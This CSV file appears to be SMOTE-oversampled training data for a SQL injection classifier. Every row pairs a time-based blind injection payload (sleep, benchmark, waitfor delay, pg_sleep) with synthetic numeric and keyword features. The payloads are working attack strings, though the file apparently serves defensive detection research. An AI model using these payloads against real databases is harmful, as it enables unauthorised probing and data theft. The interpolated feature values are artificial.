id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000412,attack,time,1'   )    )     )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000236,0.03969866244520444,42.913549074515075,14.0,2.5247846735689157,9.962949603363606,2.0,23.950599471151474,7.0,0.23208743036142393,0.046623321609153646,0.5581076223973847,0.16318162563203775,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,4.9876498677878685,0.01235013221213127,0.0,0.0,2.220446049250313e-16,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.01235013221213127,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.012350132212131
SMOTE_000413,attack,time,"1'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000231,0.6279819724663983,74.62475819288203,23.729206967852996,3.4936552724560626,17.0,19.0,29.624758192882023,9.0,0.22808723959094948,0.25492103248400233,0.3962396599063102,0.12075206801873795,0.7292069678529964,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,5.270793032147004,0.0,0.0,1.0,1.0,0.7292069678529962,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000414,attack,time,"1%' or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000284,0.06087570708690818,53.0,20.0,3.2458662088719787,10.000000000000002,10.0,24.0,9.0,0.18867924528301888,0.18867924528301888,0.4528301886792453,0.16981132075471697,0.9804928962716144,0.0195071037283856,0.0,0.0,0.0,1.0,0.0,4.0,1.0,0.0,1.0,1.0,0.9804928962716144,0.019507103728385655,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000415,attack,time,1'+  (  select 'nlvq' where 7528  =  7528 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000120,0.6392140357381199,118.25727969793525,28.48544060412951,3.468155227261664,40.97088120825902,10.0,51.80095788554671,15.485440604129511,0.3465146158140781,0.08456254116369802,0.4379468056970338,0.13097603732519003,2.4854406041295114,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,9.257279697935244,0.0,0.0,0.0,2.7427203020647557,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.7427203020647557,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.742720302064756
SMOTE_000416,attack,time,1'   )    )     )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000236,0.04927264224246917,42.946943539941856,14.0,2.5215771231551924,9.946943539941858,2.0,24.0,7.0,0.2315650237198419,0.046571816744252016,0.558861800931024,0.16300135860488205,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,2.220446049250313e-16,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.026528230029071787,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0265282300290717
SMOTE_000417,attack,time,1'   )    )     )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000236,0.7821899112415824,42.15774300108872,14.0,2.4843624028919047,9.157743001088715,2.0,24.0,7.0,0.21679269372429244,0.047467109471255,0.5696053136550601,0.1661348831493925,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,2.220446049250313e-16,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.42112849945564257,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4211284994556426
SMOTE_000418,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.3997924333745932,37.24656361157246,17.0,3.3555372443150606,13.0,0.15068727768550794,13.397250889257972,10.698625444628986,0.3499160072165534,0.004566281141985054,0.358567498588348,0.2869502130531135,0.0,0.8493127223144931,2.0,0.0,0.0,0.0,0.0,2.849312722314493,0.0,5.0,0.0,2.0,0.0,0.849312722314493,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000419,attack,time,"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",nearest_attack_euclidean,R000091,0.3305406436578978,56.85700051831011,23.35724961126742,3.9563034950711113,27.0,3.7857498704224737,16.07125064788763,10.0,0.4752562458350081,0.0668374972233387,0.2818854251509095,0.17602083179074374,2.0,3.7857498704224732,0.0,0.0,0.0,0.0,0.0,2.2142501295775263,0.0,0.0,0.0,2.220446049250313e-16,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000420,attack,time,1' rlike sleep  (  5  )   and 'cugs'  =  'cugs,nearest_attack_euclidean,R000195,1.1839696943994196,48.65370721006581,19.673146394967095,3.548603708397366,22.326853605032905,1.5577154649890304,17.32685360503291,7.442284535010969,0.458740557867948,0.03275397030491797,0.355591952537818,0.152913519289316,3.5577154649890312,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.4422845350109688,0.0,0.442284535010969,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.442284535010969,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.557715464989031,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000421,attack,time,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000058,0.6880405799205452,111.00797799752937,30.0,3.4601312379906126,38.339981664607805,10.0,49.33399816646078,13.33399816646078,0.3441528946987754,0.09031023482484146,0.4453268579229062,0.12021001255347694,1.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,9.0,0.0,0.0,0.0,2.3339981664607805,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.3339981664607805,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.3339981664607805
SMOTE_000422,attack,time,waitfor delay '0:0:5' and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000191,0.24683694602615344,51.51720616838169,20.0,3.3121698778442723,15.0,3.0371379870475623,21.51720616838169,11.962862012952439,0.29203249875457327,0.059358755829057294,0.4159350024908534,0.23267374292551601,5.037137987047562,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.8885860388573126,1.0371379870475623,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.9628620129524377,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000423,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""vjlr"" like ""vjlr",nearest_attack_euclidean,R000145,0.35724931745905025,102.10359346365358,24.11936897937129,3.2537103159113294,40.35810693811388,1.1193689793712913,47.14864162868325,13.477475917485167,0.396873442289061,0.010805166504574068,0.4604487931616348,0.13187259804473012,0.0,3.1193689793712913,0.0,0.0,1.0,0.0,0.0,9.358106938113874,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,1.1193689793712915,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.119368979371291
SMOTE_000424,attack,time,1'  )   where 1645  =  1645 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000307,0.9807366444957106,50.14820573542124,19.529084075593932,3.448731591005442,14.470915924406068,10.0,18.941831848812136,6.735457962203034,0.2885745906144431,0.20022134301102035,0.37692783821786596,0.13427622815667056,0.7354579622030337,0.26454203779696633,2.0,0.0,0.0,1.0,0.0,2.7354579622030335,0.0,0.0,0.0,3.0,0.7354579622030337,0.2645420377969663,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.2645420377969663,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.264542037796966
SMOTE_000425,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fuvv'  =  'fuvv,nearest_attack_euclidean,R000225,0.9129971569102816,90.79841545071461,28.355731616587263,3.6826655404373154,31.42292646634906,10.0,37.442683834127344,11.932805150238202,0.3479102158091832,0.11038996814679022,0.4107480909798087,0.13095172506421793,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.6442683834127343,0.0,5.288536766825469,0.0,1.0,0.0,1.6442683834127343,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000426,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fuvv'  =  'fuvv,nearest_attack_euclidean,R000225,0.21143292042236553,94.07710837645452,27.768674870636463,3.5689017562814476,30.07710837645451,10.0,41.0,13.0,0.31970156059273114,0.10629663115738576,0.43581618774528164,0.1381856205046015,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,6.0,0.0,1.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,1.0771083764545124,0.9228916235454876,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000427,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'eznq' like 'eznq",nearest_attack_euclidean,R000278,1.286982438947401,89.0,28.837516691896482,3.9690362709138727,28.450022255861974,21.38749443603451,28.774988872069013,10.387494436034507,0.31966317141417944,0.2403089262475787,0.3233144817086406,0.11671342062960119,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.3874944360345067,0.0,4.0,0.0,0.0,1.0,1.3874944360345067,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.3874944360345065,0.6125055639654935,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000428,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,0.9049206795241691,27.155971666454462,13.946791499936339,3.1678197402815385,9.631194333290894,0.315597166645448,9.893582999872681,7.315597166645446,0.35875602818736674,0.00928226960721902,0.3580860522859174,0.27387564991949687,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.3155971666454462,0.0,4.0,0.0,2.220446049250313e-16,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.3155971666454468,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.315597166645447
SMOTE_000429,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,0.41799996977676335,25.931236512863997,13.340806443446589,3.1366148372295983,9.227204295631058,0.11360214781553069,9.36322577378635,7.227204295631059,0.3628778195928551,0.0027707840930616817,0.3508816325893907,0.28346976372469257,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.2272042956310583,0.0,4.0,0.0,2.220446049250313e-16,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.11360214781552916,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1136021478155294
SMOTE_000430,attack,time,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,0.38881487870178316,87.34739309856923,27.884202300476925,3.48331559101175,16.81058389666153,20.305213802861548,38.11579769952308,12.115797699523075,0.19220466276276443,0.2327277580816093,0.4363823067832538,0.13868527237237252,1.2315953990461512,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,7.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.8842023004769244,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.11579769952307561,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1157976995230756
SMOTE_000431,attack,time,"1%' or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000284,1.0205679923128983,57.14380595078251,19.62329036811068,3.1033113439815923,10.000000000000002,10.0,27.767096318893184,9.376709631889318,0.17646283623000442,0.17646283623000442,0.4823716869347166,0.16470264060527456,1.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.753419263778636,0.6232903681106816,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000432,attack,time,"1"" where 8697  =  8697 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000233,0.6965543667072125,72.7423117856708,25.484623571341572,3.5626864098166258,15.742311785670786,18.0,30.0,9.0,0.2163835182235987,0.2474578363504425,0.4124297272507375,0.12372891817522125,0.0,1.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.7423117856707868,0.25768821432921324,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000433,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,0.056143745137803396,76.1485603493994,22.024760058233234,3.158209616087121,19.0,10.0,37.09904023293294,10.04952011646647,0.2495470721054896,0.13134056426604715,0.4871678955030689,0.13194446812539434,0.024760058233235238,1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,6.024760058233235,0.0,1.0,0.0,3.0,0.024760058233235016,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000434,attack,time,1'   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000194,0.922348534911551,36.83507535755339,13.524307245015256,2.4843426353026263,7.262153622507629,2.0,21.048614490030513,6.524307245015256,0.19750329883326068,0.05464615597611783,0.5714285714285714,0.17642197376205007,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,4.262153622507628,0.26215362250762825,0.0,0.0,2.220446049250313e-16,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.26215362250762825,0.7378463774923718,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000435,attack,time,"1%'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000171,0.5668141330862291,64.73599308446015,19.735993084460155,2.9193775133107525,10.000000000000002,10.0,34.0,10.735993084460153,0.1544807858546631,0.1544807858546631,0.5252346719058545,0.1658037563848193,1.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,6.0,0.7359930844601531,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000436,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000282,1.0496496164894644,51.232194321899456,22.303417034301642,3.647173364875743,15.0,9.142445424804384,18.92877728759781,8.16097160949726,0.2928043307584873,0.17900097252041086,0.369226298594758,0.15896839812634395,2.696582965698356,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.2321943218994518,0.2321943218994521,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000437,attack,time,1'  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000068,0.2525607852072805,32.11751819284239,14.319290912240685,2.9865329442079713,10.878050008661885,2.0,14.239468184180513,5.0,0.334081984473186,0.06291395241169548,0.4457191820858798,0.1572848810292387,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,2.220446049250313e-16,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.07982272806017132,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0798227280601713
SMOTE_000438,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000135,0.02241442859799502,50.028037700151145,17.018691800100765,3.4026684217273453,26.018691800100765,1.0,17.0,6.009345900050383,0.5200775886041918,0.019989419735792033,0.33982013550846435,0.12011285615155179,3.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.00934590005038305,0.0,2.220446049250313e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9906540999496168,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9906540999496167
SMOTE_000439,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.19603329971226696,37.83370588256004,16.916852941280023,3.325829481834588,13.0,0.0,13.916852941280023,10.916852941280023,0.3436855435136838,0.0,0.367813252494737,0.2885012039915792,0.0,0.916852941280023,2.0,0.0,0.0,0.0,0.0,3.0,0.0,5.0,0.0,2.0,0.0,0.916852941280023,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000440,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.004705733612418164,42.97319048063267,16.0,2.8024766085447808,11.0,0.0,21.977658733860565,9.995531746772112,0.2559993115732499,0.0,0.5113948051427313,0.2326058832840189,1.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,3.9955317467721128,0.0,4.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000441,attack,time,1'+  (  select echl where 6593  =  6593 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000169,1.5449558628534072,115.9305602962938,29.10694397037062,3.4337563369603696,39.4652801481469,10.0,52.125696103702836,14.33958404444407,0.3392608260711925,0.08688603996151754,0.45035337615555276,0.12349975781173715,1.4465280148146904,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,9.44652801481469,0.0,0.0,0.0,2.893056029629381,1.0,0.0,0.0,0.5534719851853096,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.4465280148146906,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.446528014814691
SMOTE_000442,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000100,0.16282300254261553,79.56374754036324,18.951527504484805,2.7143256963466937,21.19388998206078,2.0,43.515275044848046,12.854582513454414,0.2668437500382455,0.02515361002099885,0.5465523084175812,0.16145033152317448,0.0,3.9999999999999996,0.0,0.0,0.0,0.9515275044848047,0.0,7.903055008969609,0.0,0.0,0.0,0.9515275044848048,0.0,1.0,0.0,0.0,0.0,0.9515275044848047,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
